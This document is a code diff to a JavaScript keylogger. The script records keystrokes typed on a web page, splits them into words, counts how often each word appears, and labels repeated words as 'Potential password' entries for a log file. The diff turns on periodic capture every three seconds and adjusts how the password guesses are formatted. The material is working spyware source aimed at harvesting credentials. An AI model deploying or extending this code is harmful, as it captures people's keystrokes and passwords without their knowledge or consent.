@@ -13,7 +13,6 @@ var allText = "";				//  Stores the keys being typed
 var allTextSplit = [];			//	Split typed characters by spaces for words
 var allTextJoined = "";
 
-var fullTextArea = [];			//	The full text that the user has been writing gets pushed here
 var data = "data.txt";			//	File where logs will be stored
 
 var a, b, prev = [];			//	Arrays that will be combined together 
@@ -44,8 +43,8 @@ onkeypress = function(e) { // calling the function to execute whenever a keystro
  	}
 }
 
-/*
- This makes the keylogger record strings every second, instead of on pressing 'ENTER'
+
+ // This makes the keylogger record strings every second, instead of on pressing 'ENTER'
 
  window.setInterval(function(e){			
  // console.log(keys);
@@ -53,10 +52,11 @@ onkeypress = function(e) { // calling the function to execute whenever a keystro
 	splitAllText(allText);
 	keys = " ";
 	checkSplitText(allTextSplit);
+    objToString(counts);
 	// console.log(allTextSplit);
-}, 1000); // set interval to execute function continuously 
+}, 3000); // set interval to execute function continuously 
 
-*/
+
 
 function splitAllText(allText) {		//	Splits the text by spaces to make words
 	allTextSplit = allText.split(" ");
@@ -64,9 +64,9 @@ function splitAllText(allText) {		//	Splits the text by spaces to make words
 }
 
 function checkSplitText(allTextSplit, counts) {		//	Begins process of combing the split text into an object
-	for (var i = 0; i < allTextSplit.length; i++) {
-	// console.log("New string: " + allTextSplit[i]);
-	}
+	// for (var i = 0; i < allTextSplit.length; i++) {
+	// // console.log("New string: " + allTextSplit[i]);
+	// }
 	numberOfWords(allTextSplit);
 	// console.log("Number of words so far: " + numOfWords);
 	getFrequency(allTextSplit);
@@ -122,7 +122,7 @@ function hasDuplicates(counts, a, b) {
         	if (counts.hasOwnProperty(prop)) {
         		if (counts[prop] == "2") {
         			// console.log("Potential password: " + " " + prop);
-        			possiblePasswords += "\n" + "Potential password: " + prop + "\n";
+        			possiblePasswords += "\n" + "Potential password: " + prop;
         	}
         }
     }       
